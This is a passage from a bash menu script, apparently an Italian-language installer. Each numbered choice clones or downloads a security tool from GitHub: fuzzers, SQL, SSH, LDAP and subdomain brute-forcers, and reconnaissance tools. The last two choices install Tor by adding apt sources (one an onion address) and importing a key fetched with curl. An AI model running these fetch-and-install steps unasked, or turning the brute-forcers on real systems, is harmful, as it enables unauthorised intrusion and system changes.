		Clona "hadoocn/conscan"
	;;
	"676")
		Clona "rudSarkar/crlf-injector"
	;;
	"677")
		Clona "MozillaSecurity/dharma"
	;;
	"678")
		Clona "ernw/dizzy"
	;;
	"679")
		Clona "googleprojectzero/domato"
	;;
	"680")
		Clona "wireghoul/doona"
	;;
	"681")
		Clona "zznop/flyr"
	;;
	"682")
		Clona "nccgroup/FrisbeeLite"
	;;
	"683")
		Clona "k0retux/fuddly"
	;;
	"684")
		Clona "nol13/fuzzball"
	;;
	"685")
		Scarica "$ENTRAW""OblivionDev/fuzzdiff/master/fuzzdiff"
	;;
	"686")
		Clona "nccgroup/fuzzowski"
	;;
	"687")
		Clona "renatahodovan/grammarinator"
	;;
	"688")
		Scarica "$ENTRAW""lobuhi/byp4xx/main/byp4xx.sh"
	;;
	"689")
		Clona "savio-code/hexorbase"
	;;
	"690")
		Clona "nccgroup/Hodor"
	;;
	"691")
		Clona "google/honggfuzz"
	;;
	"692")
		Clona "tehmoon/http-fuzzer"
	;;
	"693")
		Clona "andresriancho/websocket-fuzzer"
	;;
	"694")
		Clona "twilsonb/jbrofuzz"
	;;
	"695")
		Clona "cisco-sas/kitty"
	;;
	"696")
		Clona "mxmssh/manul"
	;;
	"697")
		Clona "IOActive/Melkor_ELF_Fuzzer"
	;;
	"698")
		Clona "mazzoo/ohrwurm"
	;;
	"699")
		Clona "MozillaSecurity/peach"
	;;
	"700")
		Clona "calebstewart/peach"
	;;
	"701")
		Clona "marcinguy/powerfuzzer"
	;;
	"702")
		Clona "HSASec/ProFuzz"
	;;
	"703")
		Clona "hgascon/pulsar"
	;;
	"704")
		Clona "mseclab/PyJFuzz"
	;;
	"705")
		ClonaLab "akihe/radamsa"
	;;
	"706")
		Scarica "$ENTRAW""pbnj/s3-fuzzer/master/main.go"
	;;
	"707")
		Clona "Battelle/sandsifter"
	;;
	"708")
		Clona "mfontanini/sloth-fuzzer"
	;;
	"709")
		Scarica "$ENTRAW""nopper/archpwn/master/repo/fuzzer/smtp-fuzz/smtp-fuzz.pl"
	;;
	"710")
		Scarica "$ENTRAW""LukasRypl/snmp-fuzzer/master/snmp-fuzzer.py"
		Scarica "$ENTSSL""LukasRypl/snmp-fuzzer/raw/master/exportedSNMPv1Trap"
	;;
	"711")
		Scarica "$ENTRAW""landw1re/socketfuzz/master/socketfuzz.py"
	;;
	"712")
		Clona "allfro/sploitego"
	;;
	"713")
		Scarica "$ENTRAW""GDSSecurity/SQLBrute/master/sqlbrute.py"
	;;
	"714")
		Scarica "$ENTRAW""wireghoul/sploit-dev/master/sshfuzz.pl"
	;;
	"715")
		Clona "rsmusllp/termineter"
	;;
	"716")
		Clona "droberson/thefuzz"
	;;
	"717")
		Clona "kernelslacker/trinity"
	;;
	"718")
		Clona "PAGalaxyLab/uniFuzzer"
	;;
	"719")
		Scarica "$ENTRAW""nullsecuritynet/tools/master/fuzzer/tftp-fuzz/release/tftp-fuzz.py"
	;;
	"720")
		Scarica "$ENTRAW""nullsecuritynet/tools/master/fuzzer/uniofuzz/source/uniofuzz.py"
	;;
	"721")
		Clona "andresriancho/w3af"
	;;
	"722")
		Clona "OWASP/OWASP-WebScarab"
	;;
	"723")
		Clona "wereallfeds/webshag"
	;;
	"724")
		Clona "samhocevar/zzuf"
	;;
	"725")
		Clona "alpkeskin/mosint"
	;;
	"726")
		Clona "SpiderLabs/ikeforce"
	;;
	"727")
		Clona "royhills/ike-scan"
	;;
	"728")
		Clona "droope/ldap-brute"
	;;
	"729")
		Scarica "$ENTRAW""chris408/ct-exposer/master/ct-exposer.py"
		Scarica "$ENTRAW""chris408/ct-exposer/master""$RQRM"
	;;
	"730")
		Clona "gotr00t0day/IGF"
	;;
	"731")
		Clona "gotr00t0day/forbiddenpass"
	;;
	"732")
		Clona "gotr00t0day/spyhunt"
	;;
	"733")
		Scarica "$ENTRAW""gotr00t0day/spider00t/master/spider00t.py"
		Scarica "$ENTRAW""gotr00t0day/spider00t/master""$RQRM"
	;;
	"734")
		Scarica "$ENTRAW""gotr00t0day/subdomainbrute/master/subdomainbrute.py"
		Scarica "$ENTRAW""gotr00t0day/subdomainbrute/master""$RQRM"
	;;
	"735")
		Clona "gotr00t0day/oswalkpy"
	;;
	"736")
		Scarica "$ENTRAW""gotr00t0day/VulnBanner/master/vulnbanner.py"
		Scarica "$ENTRAW""gotr00t0day/VulnBanner/master/vulnbanners.txt"
	;;
	"737")
		Scarica "$ENTRAW""gotr00t0day/b1n4ryR3v3rs3/master/binaryreverse.sh"
	;;
	"738")
		Scarica "$ENTRAW""gotr00t0day/SSHbrute/master/sshbrute.py"
	;;
	"739")
		echo "Digit the OS name"
		uname -a
		read -p "(example, stretch): " DSTR
		if [[ "$DSTR" != "" ]];
		then
			echo "deb https://deb.torproject.org/torproject.org $DSTR main" >> /etc/apt/sources.list
			echo "deb-src https://deb.torproject.org/torproject.org $DSTR main" >> /etc/apt/sources.list
			curl https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import
			gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -
			apt update
			apt install tor deb.torproject.org-keyring
		fi
	;;
	"740")
		echo "Digit the OS name"
		uname -a
		read -p "(example, stretch): " DSTR
		if [[ "$DSTR" != "" ]];
		then
			apt install apt-transport-tor
			echo "deb tor://sdscoq7snqtznauu.onion/torproject.org $DSTR main" >> /etc/apt/sources.list
			apt update
			apt install tor
		fi
	;;
	*)
		echo "error, invalid choice"
	;;
	esac
	read -p "press ENTER to continue..."
	echo -ne "\n$SEP\n\n"
done
